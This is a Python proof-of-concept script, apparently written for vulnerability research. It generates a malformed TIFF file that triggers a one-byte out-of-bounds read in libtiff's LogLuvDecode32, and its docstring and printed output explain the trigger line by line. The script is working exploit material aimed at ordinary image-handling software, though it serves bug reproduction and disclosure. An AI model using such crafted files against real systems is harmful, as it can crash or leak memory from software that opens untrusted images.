#!/usr/bin/env python3
"""
VULN 003: LogLuvDecode32 out-of-bounds read
File: libtiff/libtiff/tif_luv.c, lines 310-314

Trigger:
  Line 310: for (i = 0; i < npixels && cc > 0; )
  Line 311:   if (*bp >= 128) {   /* run */
  Line 312:       rc = *bp++ + (2-128);
  Line 313:       b = (uint32)*bp++ << shft;  <-- reads 2nd byte without checking cc
  Line 314:       cc -= 2;

With StripByteCounts=1 and strip_data[0] >= 0x80:
  - cc=1, enters loop (cc > 0 is true)
  - *bp=0x80 >= 128, enters run branch
  - Line 312 reads bp[0] (valid)
  - Line 313 reads bp[1] (ONE PAST END = out-of-bounds)
"""

import struct
import os

out_dir = '/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_luv_c'
os.makedirs(out_dir, exist_ok=True)

# TIFF entries (sorted by tag)
entries = [
    (0x0100, 3, 1, 1),         # ImageWidth = 1
    (0x0101, 3, 1, 1),         # ImageLength = 1
    (0x0102, 3, 1, 8),         # BitsPerSample = 8
    (0x0103, 3, 1, 34676),     # Compression = SGILOG (0x8774)
    (0x0106, 3, 1, 32845),     # PhotometricInterpretation = LOGLUV (0x806D)
    (0x0111, 4, 1, 0),         # StripOffsets (placeholder, filled below)
    (0x0115, 3, 1, 3),         # SamplesPerPixel = 3
    (0x0116, 4, 1, 1),         # RowsPerStrip = 1
    (0x0117, 4, 1, 1),         # StripByteCounts = 1  <-- KEY: only 1 byte in strip
]

# Calculate offsets
header_size = 8         # 'II' + magic(2) + ifd_offset(4)
ifd_offset = 8
n_entries = len(entries)
ifd_size = 2 + n_entries * 12 + 4   # count(2) + entries + next_ifd(4)
strip_data_offset = ifd_offset + ifd_size

# Patch StripOffsets with computed offset
entries = [
    (e[0], e[1], e[2], strip_data_offset) if e[0] == 0x0111 else e
    for e in entries
]

# Strip data: single byte >= 0x80 triggers run branch in LogLuvDecode32
strip_data = bytes([0x80])  # value 128: enters run branch, then reads bp[1] OOB

# Build IFD
ifd = struct.pack('<H', n_entries)
for tag, typ, count, value in entries:
    ifd += struct.pack('<HHII', tag, typ, count, value)
ifd += struct.pack('<I', 0)  # next IFD offset = 0 (no more IFDs)

# Build complete TIFF
header = b'II' + struct.pack('<HI', 42, ifd_offset)  # little-endian, magic=42
tiff_data = header + ifd + strip_data

out_path = os.path.join(out_dir, 'vuln_003.tif')
with open(out_path, 'wb') as f:
    f.write(tiff_data)

print(f"Generated {out_path} ({len(tiff_data)} bytes)")
print(f"  IFD offset:        {ifd_offset}")
print(f"  IFD size:          {ifd_size}")
print(f"  Strip data offset: {strip_data_offset}")
print(f"  Strip data:        {strip_data.hex()} (1 byte, >= 0x80 triggers run branch)")
print()
print("Vulnerability trigger:")
print("  StripByteCounts=1 => cc=1 in LogLuvDecode32")
print("  strip_data[0]=0x80 >= 128 => enters run branch")
print("  Line 312: reads bp[0] (valid)")
print("  Line 313: reads bp[1] (out-of-bounds!)")
